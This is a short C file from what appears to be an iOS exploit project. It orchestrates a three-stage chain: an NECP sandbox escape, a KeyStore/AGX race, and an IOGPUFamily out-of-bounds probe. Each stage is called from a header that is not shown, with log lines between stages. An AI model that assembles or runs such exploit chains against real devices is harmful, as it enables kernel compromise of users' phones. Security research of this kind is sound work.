/* chain.c — sandbox-escape + race + IOGPU OOB chain runner (23C55). *
 * Stage 1: nk_dataonly_necp_chain()  — NECP dataOnly (needs toggles *
 *          in Settings: NECP chain + sandbox escape).               *
 * Stage 2: nk_racer_run()            — KeyStore/AGX race harness.   *
 * Stage 3: nk_iogpu_oob_run()        — IOGPUFamily OOB (CVE probe). */
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include "exploit.h"

void nk_chain_run(void) {
    nk_filelog_open("chain");
    nk_log("[ch] chain stage 1: NECP dataOnly");
    nk_dataonly_necp_chain();
    nk_log("[ch] stage 1 done -> stage 2: race (this line = stage1 returned)");
    nk_racer_run();
    nk_log("[ch] stage 2 done -> stage 3: IOGPU OOB (this line = stage2 returned)");
    fflush(stdout);
    nk_iogpu_oob_run();
    nk_log("[ch] chain end (stage3 returned)");
    nk_filelog_close();
}
